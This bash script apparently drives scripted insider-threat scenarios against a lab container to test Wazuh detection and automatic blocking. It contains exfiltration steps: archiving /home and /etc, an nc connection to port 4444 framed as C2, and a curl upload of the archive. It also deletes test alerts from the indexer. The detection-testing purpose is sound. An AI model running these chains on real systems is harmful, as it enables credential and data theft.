#!/bin/bash
# Drives the insider-threat scenario 3 sub-scenario A/B/C command chains
# against dmz-ubuntu, exactly as scripted in docs/report.txt chapter 4
# (4.1/4.2/4.3, tables 23-25). Must run on the Docker host itself - dmz-ubuntu
# does not publish port 22 externally, so its sshd is only reachable from the
# dmz-ubuntu_default bridge gateway side (see
# roles/insider_threat_agent_linux/defaults/main.yml's insider_threat_mgmt_ip
# comment).
#
# Account mapping (confirmed against docs/report.txt 4.1/4.2/4.3, NOT the
# earlier "one account per sub-scenario" assumption - see
# insider-threat-test/DEVIATIONS.md item #19 for why C logs in directly as
# it.prlab instead of literally running report.txt's scripted `su -
# it.prlab` from within an ubuntu session):
#   A (data theft):              ubuntu     (whoami, nmap, ssh, tar, nc 4444, curl)
#   B (cred theft + lateral move): ubuntu     (whoami, id, ssh, tar, nc 4444)
#   C (routine admin, whitelisted): it.prlab (whoami, nmap, ssh, tar)
#
# D (SUPPLEMENTARY - not in docs/report.txt, see DEVIATIONS.md item #26):
# whitelisted it.prlab running B's full command chain including nc 4444, to
# check whether a whitelisted account (V3=0) still gets AUTO_BLOCK'd once it
# reaches the C2 stage. D is NEVER included in `all` - it must be passed
# explicitly, and only after A/B/C have already completed.
#
# No secrets or hardcoded IPs: the Wazuh manager IP is resolved from
# inventory/hosts.ini via `ansible-inventory` (read-only), link-network IPs
# come from group_vars/all.yml, and the AR release credentials used by
# --reset are read from group_vars/soc.yml at call time and never echoed.
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ALL_YML="$REPO_ROOT/group_vars/all.yml"
SOC_YML="$REPO_ROOT/group_vars/soc.yml"
SSH_KEY="$REPO_ROOT/secrets/insider_threat_test_key"
GAP_SECONDS=140 # > rule 100410's 120s same-auid/same-agent correlation window

# Gap between CONSECUTIVE commands within the SAME sub-scenario (see
# DEVIATIONS.md item #27). progression_calc's wazuh_history_query step
# reconstructs the attack chain via an indexer _search over prior alerts
# for this auid - that search only sees alerts that have made it all the
# way through auditd -> wazuh-agent -> manager -> filebeat -> indexer. This
# end-to-end indexing lag (NOT the same thing as report.txt's own MTTD
# metric, which measures only Wazuh's own alert generation time and is
# unaffected by any of this) was measured live, 10 trials of a single
# `whoami` 20s apart, timing from command execution to the first moment
# the same query shape the score_alert pipeline uses can see it:
# min=8.41s avg=10.85s max=15.26s. report.txt's original test was manually
# typed step by step, which incidentally left more than max=15.26s between
# commands and so never hit this. Firing ssh/tar/nc/curl back to back with
# no gap (the old behavior) reliably lands multiple commands inside the
# same still-not-yet-indexed window, undercounting progression_depth and
# silently producing a lower score than report.txt's documented 85.
# Default = ceil(measured max) + 3s margin. Must stay far below the
# sub-scenario GAP_SECONDS (140s, itself bounded by the still-broken rule
# 100410's 120s window - see DEVIATIONS #23) so it doesn't push any
# command outside the same correlation window it's meant to stay inside of.
STEP_GAP_SECONDS="${STEP_GAP_SECONDS:-19}"

yaml_get() {
  python3 -c "
import yaml
with open('$1') as f:
    d = yaml.safe_load(f)
print(d.get('$2', ''))
"
}

LAN_IP=$(yaml_get "$ALL_YML" insider_threat_lan_link_ip)
LINK_SUBNET=$(yaml_get "$ALL_YML" insider_threat_link_subnet)

DMZ_IP=$(docker inspect dmz-ubuntu --format '{{(index .NetworkSettings.Networks "dmz-ubuntu_default").IPAddress}}')

SSH_OPTS=(-i "$SSH_KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5)

run_as() {
  local user="$1"; shift
  ssh "${SSH_OPTS[@]}" "${user}@${DMZ_IP}" "$@"
}

release_isolation() {
  # Pulls creds from group_vars/soc.yml only for the duration of this one
  # API call - never echoed, never written to a file.
  local wz_user wz_pass wz_mgr agent_id token http_status
  wz_user=$(yaml_get "$SOC_YML" wazuh_api_user)
  wz_pass=$(yaml_get "$SOC_YML" wazuh_api_password)
  agent_id=$(yaml_get "$SOC_YML" dmz_ubuntu_agent_id)
  wz_mgr=$(ansible-inventory -i "$REPO_ROOT/inventory/hosts.ini" --list 2>/dev/null \
    | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['_meta']['hostvars']['soc-host']['ansible_host'])")

  token=$(curl -sk -u "${wz_user}:${wz_pass}" -X POST "https://${wz_mgr}:55000/security/user/authenticate" \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['token'])")

  http_status=$(curl -sk -o /dev/null -w '%{http_code}' -X PUT \
    -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
    "https://${wz_mgr}:55000/active-response?agents_list=${agent_id}" \
    -d '{"command":"host-isolate0","arguments":["delete"],"alert":{"data":{"reason":"run_attack.sh --reset"}}}')
  echo "[reset] AR release call returned HTTP ${http_status}"
}

resolve_wazuh_server_ip() {
  ansible-inventory -i "$REPO_ROOT/inventory/hosts.ini" --list 2>/dev/null \
    | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['_meta']['hostvars']['soc-host']['ansible_host'])"
}

# Clears the test accounts' insider-threat alert history from the Wazuh
# indexer so each sub-scenario run starts from a clean 24h LIS window.
# The filter below is FIXED and intentionally NOT parameterized - it must
# stay identical to the one the operator previewed/approved
# (agent.name=dmz-ubuntu AND data.audit.auid in [21001,21002,21003] AND
# rule.groups contains insider_threat). Never widen this without the same
# count-preview-first approval flow. SAFETY_CAP refuses to delete if the
# pre-delete count looks anomalously large, since that would indicate the
# filter got mangled somehow and is matching far more than our own test
# fixtures.
clear_indexer_history() {
  local SAFETY_CAP=200
  local query='{"query":{"bool":{"must":[{"term":{"agent.name":"dmz-ubuntu"}},{"terms":{"data.audit.auid":["21001","21002","21003"]}},{"term":{"rule.groups":"insider_threat"}}]}}}'
  local id_url id_user id_pass wz_mgr count_before count_after deleted

  wz_mgr=$(resolve_wazuh_server_ip)
  id_url=$(yaml_get "$SOC_YML" wazuh_indexer_url | sed "s/{{ wazuh_server_ip }}/${wz_mgr}/")
  id_user=$(yaml_get "$SOC_YML" wazuh_indexer_user)
  id_pass=$(yaml_get "$SOC_YML" wazuh_indexer_password)

  count_before=$(curl -sk -u "${id_user}:${id_pass}" -X POST "${id_url}/wazuh-alerts-*/_count" \
    -H 'Content-Type: application/json' -d "$query" \
    | python3 -c "import json,sys; print(json.load(sys.stdin).get('count',-1))")
  echo "[reset] indexer history count before delete: ${count_before}"

  if [ "$count_before" -lt 0 ]; then
    echo "[reset] ERROR: could not determine count - aborting delete." >&2
    return 1
  fi
  if [ "$count_before" -eq 0 ]; then
    echo "[reset] nothing to delete."
    return 0
  fi
  if [ "$count_before" -gt "$SAFETY_CAP" ]; then
    echo "[reset] REFUSING to delete: count ${count_before} exceeds safety cap ${SAFETY_CAP}. The filter may have been altered or is matching unintended data - aborting without deleting anything." >&2
    return 1
  fi

  deleted=$(curl -sk -u "${id_user}:${id_pass}" -X POST "${id_url}/wazuh-alerts-*/_delete_by_query?conflicts=proceed&refresh=true" \
    -H 'Content-Type: application/json' -d "$query" \
    | python3 -c "import json,sys; print(json.load(sys.stdin).get('deleted',-1))")
  echo "[reset] deleted: ${deleted}"

  count_after=$(curl -sk -u "${id_user}:${id_pass}" -X POST "${id_url}/wazuh-alerts-*/_count" \
    -H 'Content-Type: application/json' -d "$query" \
    | python3 -c "import json,sys; print(json.load(sys.stdin).get('count',-1))")
  echo "[reset] indexer history count after delete: ${count_after}"
  if [ "$count_after" -ne 0 ]; then
    echo "[reset] WARNING: post-delete count is not 0!" >&2
    return 1
  fi
}

step_gap() {
  echo "[wait] sleeping ${STEP_GAP_SECONDS}s (indexer settle, see DEVIATIONS #27)..."
  sleep "$STEP_GAP_SECONDS"
}

reset_target() {
  echo "[reset] removing leftover attack artifacts on dmz-ubuntu..."
  run_as ubuntu   "rm -f /tmp/steal.tgz /tmp/creds.tgz" || true
  run_as it.prlab "rm -f /tmp/logs.tgz /tmp/d_creds.tgz" || true
  echo "[reset] forcing AR release in case a prior run left isolation applied..."
  release_isolation || true
  echo "[reset] clearing test accounts' indexer history..."
  clear_indexer_history
}

scenario_a() {
  echo "=== Sub-scenario A (data theft, ubuntu) ==="
  run_as ubuntu "whoami"
  step_gap
  run_as ubuntu "nmap -sn ${LINK_SUBNET}"
  step_gap
  run_as ubuntu "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 ubuntu@${LAN_IP} exit" || true
  step_gap
  run_as ubuntu "tar czf /tmp/steal.tgz /home/ubuntu"
  step_gap
  run_as ubuntu "nc ${LAN_IP} 4444 </dev/null" || true
  step_gap
  run_as ubuntu "curl -s -T /tmp/steal.tgz http://${LAN_IP}:8000/" || true
}

scenario_b() {
  echo "=== Sub-scenario B (cred theft + lateral move, ubuntu) ==="
  run_as ubuntu "whoami"
  step_gap
  run_as ubuntu "id"
  step_gap
  run_as ubuntu "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 ubuntu@${LAN_IP} exit" || true
  step_gap
  run_as ubuntu "tar czf /tmp/creds.tgz /etc" || true
  step_gap
  run_as ubuntu "nc ${LAN_IP} 4444 </dev/null" || true
}

scenario_c() {
  echo "=== Sub-scenario C (routine admin, it.prlab, whitelisted) ==="
  run_as it.prlab "whoami"
  step_gap
  run_as it.prlab "nmap -sn ${LINK_SUBNET}"
  step_gap
  run_as it.prlab "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 ubuntu@${LAN_IP} exit" || true
  step_gap
  run_as it.prlab "tar czf /tmp/logs.tgz /var/log" || true
}

# SUPPLEMENTARY, not in docs/report.txt - see header comment and
# DEVIATIONS.md item #26. Identical command chain to scenario_b, run as the
# whitelisted it.prlab account instead of ubuntu, to directly test whether a
# whitelisted account still gets AUTO_BLOCK'd once it reaches the nc 4444
# C2 stage.
scenario_d() {
  echo "=== Sub-scenario D (SUPPLEMENTARY - whitelisted it.prlab running B's chain through nc 4444) ==="
  run_as it.prlab "whoami"
  step_gap
  run_as it.prlab "id"
  step_gap
  run_as it.prlab "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 ubuntu@${LAN_IP} exit" || true
  step_gap
  run_as it.prlab "tar czf /tmp/d_creds.tgz /etc" || true
  step_gap
  run_as it.prlab "nc ${LAN_IP} 4444 </dev/null" || true
}

TARGET="${1:-}"
for arg in "$@"; do
  if [ "$arg" = "--reset" ]; then
    reset_target
  fi
done

case "$TARGET" in
  A) scenario_a ;;
  B) scenario_b ;;
  C) scenario_c ;;
  D) scenario_d ;;
  all)
    scenario_a
    echo "[wait] sleeping ${GAP_SECONDS}s before B (100410 correlation window)..."
    sleep "$GAP_SECONDS"
    scenario_b
    echo "[wait] sleeping ${GAP_SECONDS}s before C (100410 correlation window)..."
    sleep "$GAP_SECONDS"
    scenario_c
    # D is intentionally NOT run here - see header comment / DEVIATIONS #26.
    ;;
  --reset|"")
    ;;
  *)
    echo "Usage: $0 [A|B|C|D|all] [--reset]  (D is supplementary, never included in 'all' - pass it explicitly, after A/B/C)" >&2
    exit 1
    ;;
esac
